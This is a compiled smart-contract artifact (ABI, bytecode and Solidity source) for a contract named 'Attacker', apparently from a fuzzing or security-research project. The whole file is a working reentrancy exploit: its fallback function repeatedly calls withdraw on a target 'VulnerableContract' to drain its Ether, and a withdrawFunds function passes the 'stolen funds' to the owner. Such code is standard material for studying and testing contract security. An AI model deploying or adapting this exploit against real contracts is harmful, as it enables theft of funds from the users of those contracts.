{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_vulnerableAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "attackAmount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "balances",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "vulnerable",
      "outputs": [
        {
          "internalType": "contract VulnerableContract",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "stateMutability": "payable",
      "type": "receive",
      "payable": true
    },
    {
      "inputs": [
        {
          "internalType": "uint256",
          "name": "_amount",
          "type": "uint256"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    },
    {
      "inputs": [],
      "name": "withdrawFunds",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "deposit",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function",
      "payable": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516109bd3803806109bd833981810160405281019061003291906100ce565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610140565b6000815190506100c881610129565b92915050565b6000602082840312156100e057600080fd5b60006100ee848285016100b9565b91505092915050565b600061010282610109565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b610132816100f7565b811461013d57600080fd5b50565b61086e8061014f6000396000f3fe6080604052600436106100745760003560e01c8063881935651161004e57806388193565146101bb5780638da5cb5b146101e6578063d0e30db014610211578063f66ad59a1461021b5761007b565b806324600fc31461014b57806327e235e31461016257806364dd891a1461019f5761007b565b3661007b57005b60025460008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101495760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d6002546040518263ffffffff1660e01b815260040161011691906106f9565b600060405180830381600087803b15801561013057600080fd5b505af1158015610144573d6000803e3d6000fd5b505050505b005b34801561015757600080fd5b50610160610246565b005b34801561016e57600080fd5b5061018960048036038101906101849190610584565b610341565b60405161019691906106f9565b60405180910390f35b6101b960048036038101906101b491906105ad565b610359565b005b3480156101c757600080fd5b506101d06104b2565b6040516101dd91906106f9565b60405180910390f35b3480156101f257600080fd5b506101fb6104b8565b6040516102089190610683565b60405180910390f35b6102196104de565b005b34801561022757600080fd5b50610230610536565b60405161023d919061069e565b60405180910390f35b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146102d6576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016102cd906106d9565b60405180910390fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc479081150290604051600060405180830381858888f1935050505015801561033e573d6000803e3d6000fd5b50565b60036020528060005260406000206000915090505481565b8034101561039c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610393906106b9565b60405180910390fd5b8060028190555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0826040518263ffffffff1660e01b81526004016000604051808303818588803b15801561040b57600080fd5b505af115801561041f573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d826040518263ffffffff1660e01b815260040161047d91906106f9565b600060405180830381600087803b15801561049757600080fd5b505af11580156104ab573d6000803e3d6000fd5b5050505050565b60025481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b34600360003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600082825461052d9190610725565b92505081905550565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000813590506105698161080a565b92915050565b60008135905061057e81610821565b92915050565b60006020828403121561059657600080fd5b60006105a48482850161055a565b91505092915050565b6000602082840312156105bf57600080fd5b60006105cd8482850161056f565b91505092915050565b6105df8161077b565b82525050565b6105ee816107b7565b82525050565b6000610601601f83610714565b91507f4e6565642073756666696369656e7420457468657220746f2061747461636b006000830152602082019050919050565b6000610641601783610714565b91507f4f6e6c79206f776e65722063616e2077697468647261770000000000000000006000830152602082019050919050565b61067d816107ad565b82525050565b600060208201905061069860008301846105d6565b92915050565b60006020820190506106b360008301846105e5565b92915050565b600060208201905081810360008301526106d2816105f4565b9050919050565b600060208201905081810360008301526106f281610634565b9050919050565b600060208201905061070e6000830184610674565b92915050565b600082825260208201905092915050565b6000610730826107ad565b915061073b836107ad565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff038211156107705761076f6107db565b5b828201905092915050565b60006107868261078d565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006107c2826107c9565b9050919050565b60006107d48261078d565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6108138161077b565b811461081e57600080fd5b50565b61082a816107ad565b811461083557600080fd5b5056fea26469706673582212206f908e601a3f972d3377725a4f94170d18fa9b30a0510d1591d0262cb27b7ae564736f6c63430008000033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./VulnerableContract.sol\";\r\n\r\ncontract Attacker {\r\n    VulnerableContract public vulnerable;\r\n    address public owner;\r\n    uint256 public attackAmount;\r\n    mapping(address => uint256) public balances;\r\n\r\n    constructor(address _vulnerableAddress) {\r\n        vulnerable = VulnerableContract(_vulnerableAddress);\r\n        owner = msg.sender;\r\n    }\r\n\r\n    // Fallback function for reentrancy\r\n    fallback() external payable {\r\n        if (address(vulnerable).balance >= attackAmount) {\r\n            vulnerable.withdraw(attackAmount);  // Recursively withdraw\r\n        }\r\n    }\r\n\r\n    // Receive Ether function for direct transfers\r\n    receive() external payable {\r\n        // Handle plain Ether transfers\r\n    }\r\n\r\n    // Initiate the attack with a specified amount\r\n    function attack(uint256 _amount) external payable {\r\n        require(msg.value >= _amount, \"Need sufficient Ether to attack\");\r\n        attackAmount = _amount;\r\n        vulnerable.deposit{value: _amount}();  // Deposit to vulnerable contract\r\n        vulnerable.withdraw(_amount);  // Start reentrancy attack\r\n    }\r\n\r\n    // Withdraw stolen funds\r\n    function withdrawFunds() external {\r\n        require(msg.sender == owner, \"Only owner can withdraw\");\r\n        payable(owner).transfer(address(this).balance);\r\n    }\r\n\r\n    // Deposit Ether into the contract\r\n    function deposit() public payable {\r\n        balances[msg.sender] += msg.value;\r\n    }\r\n}\r\n",
  "sourcePath": "C:\\Users\\andri\\dev\\github\\smartcontractdrlfuz\\env1_dev2\\contracts\\Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.8.0+commit.c7dfd78e.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2024-09-19T03:23:10.355Z",
  "networkType": "ethereum",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}